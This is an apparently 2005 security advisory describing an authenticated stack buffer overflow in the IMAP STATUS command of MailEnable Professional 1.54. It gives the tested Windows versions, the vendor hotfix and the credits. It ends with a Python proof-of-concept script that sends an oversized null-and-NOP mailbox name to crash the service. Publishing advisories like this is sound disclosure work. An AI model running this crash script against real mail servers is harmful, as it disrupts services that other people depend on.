*Vulnerability Description:*

 MailEnable is a mail server software which provides a messaging
 platform for Microsoft Windows. For more information about
 MailEnable see  http://www.mailenable.com/

 A buffer overflow vulnerability was found in the status command.
 Remote exploitation of this vulnerability could allow an attacker
 to execute arbitrary code with System privileges. The status command
 requires an authenticated session, so valid credentials are required.
 

*Vulnerable Packages:*

 MailEnable Professional edition version 1.54

 Tested on:
 . Windows 2000 sp0
 . Windows 2000 sp2
 . Windows XP sp0


*Solution/Vendor Information/Workaround:*

 This issue was addressed by the last hotfix for MailEnable (dated
 30th May 2005). The hotfix can be downloaded from:
 http://www.mailenable.com/hotfix/


*Credits:*

 This vulnerability was found by Ariel Sanchez from Core Security
 Technologies.

 We wish to thank Peter Fregon from MailEnable for his quick response
 to this issue.


*Technical Description - Exploit/Concept Code:*

 This vulnerability was found in the Imapd daemon service of MailEnable
 Professional edition version 1.54.  
 
 The vulnerability can be triggered by giving a long mailbox name
 argument to the status command. This will cause a stack based buffer
 overflow, containing null bytes (\x00).

 The following is a Python proof-of-concept code that will trigger the
 vulnerability:

----------------------------------------------------------------------
#
# POC about imapd mailenable bug in status command
#

import sys
import imaplib

class poc:

    def __init__(self,host,loginimap,passimap):
        self.host=host
        self.loginimap=loginimap
        self.passimap=passimap

    def exploit(self):
        print "Please wait"
        
        connect = imaplib.IMAP4(self.host)
        connect.login(self.loginimap,self.passimap)
        nops='\x00'
        nops+='\x90'*10540
        try:
            typ, data = connect.status(nops,'(UIDNEXT UIDVALIDITY 
MESSAGES UNSEEN RECENT)')
        except Exception,e:
            print "Service down!"
        return 0    

if(len(sys.argv) < 4):
    print "Need 3 arguments, ./poc.py host user pass"
    sys.exit(1)

exp=poc(sys.argv[1],sys.argv[2],sys.argv[3])
exp.exploit()
